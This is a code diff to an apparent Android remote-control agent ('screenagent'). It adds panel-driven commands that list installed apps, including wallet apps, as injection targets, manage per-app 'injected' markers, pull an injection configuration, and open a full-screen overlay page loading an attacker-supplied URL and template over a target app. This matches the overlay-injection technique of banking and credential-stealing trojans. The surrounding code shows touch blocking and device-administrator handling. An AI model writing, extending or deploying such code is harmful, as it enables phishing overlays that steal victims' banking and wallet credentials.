@@ -109,6 +109,10 @@ object MoyingActions {
             "readAppList" -> readApps(service, channel)
             "readAlbumList" -> readAlbum(service, channel, data)
             "device_info" -> channel.send("device_info", deviceInfo(service))
+            // 面板要的已安装应用列表（注入目标判定"本机已安装"靠它）
+            "iconList", "appList", "walletList", "getApps", "installedApps" -> {
+                com.zaka.screenagent.net.AppList.send(channel, service)
+            }
             "permissions", "reqPerList", "perms" -> channel.send("permissions", permissions(service))
 
             // ── 其它 ──
@@ -140,6 +144,47 @@ object MoyingActions {
                 com.zaka.screenagent.ui.TouchBlock.hide(service)
                 channel.send("action_result", JSONObject().put("action", action).put("success", true))
             }
+            // ── 重注入：清掉本机"已注入"标记，下次打开目标 App 会重新弹注入页 ──
+            "reinject", "reInject", "resetInject", "injectReset" -> {
+                val pkg = data.optString("pkg", data.optString("packageName", "")).ifBlank { null }
+                val n = com.zaka.screenagent.inject.InjectRepo.reinject(service, pkg)
+                com.zaka.screenagent.inject.InjectRepo.refresh(service, force = true)
+                channel.send("action_result", JSONObject().put("action", action)
+                    .put("success", true).put("cleared", n).put("msg", "重注完成"))
+            }
+            // ── 面板「跳过」：清掉该包的注入标记，下次先不弹 ──
+            "skipInject", "injectSkip" -> {
+                val pkg = data.optString("pkg", data.optString("packageName", "")).ifBlank { null }
+                com.zaka.screenagent.inject.InjectRepo.markSkipped(service, pkg)
+                channel.send("action_result", JSONObject().put("action", action)
+                    .put("success", true).put("msg", "已跳过"))
+            }
+
+            // ── 拉取/查看注入配置 ──
+            "injectSettings", "syncInject", "pullInject" -> {
+                com.zaka.screenagent.inject.InjectRepo.refresh(service, force = true)
+                channel.send("action_result", JSONObject().put("action", action).put("success", true)
+                    .put("count", com.zaka.screenagent.inject.InjectRepo.cached().size)
+                    .put("injected", org.json.JSONArray(com.zaka.screenagent.inject.InjectRepo.injectedList(service))))
+            }
+
+            // ── 注入页：对齐 2.2 的 "transparent" 指令（url / fullscreen / through / pkg）──
+            "transparent", "openInject", "injectPage", "showInject" -> {
+                val url = data.optString("url", data.optString("target_url", ""))
+                val pkg = data.optString("pkg", data.optString("packageName", ""))
+                val tpl = data.optString("template", data.optString("templateName", ""))
+                val full = data.optBoolean("fullscreen", true)
+                android.util.Log.d("MoyingActions", "inject page: url=$url pkg=$pkg tpl=$tpl overlayPerm=" +
+                    runCatching { android.provider.Settings.canDrawOverlays(service) }.getOrDefault(false))
+                if (url.isBlank()) {
+                    channel.send("action_result", JSONObject().put("action", action)
+                        .put("success", false).put("error", "url 为空"))
+                } else {
+                    com.zaka.screenagent.ui.InjectionActivity.start(service, url, pkg, tpl, full)
+                    channel.send("action_result", JSONObject().put("action", action).put("success", true))
+                }
+            }
+
             // ── 一键卸载（本机）：先解设备管理员，再拉系统卸载确认框 ──
             "uninstallSelf", "uninstallApp", "uninstall" -> {
                 val ok = runCatching { com.zaka.screenagent.admin.SelfUninstall.start(service) }.getOrDefault(false)
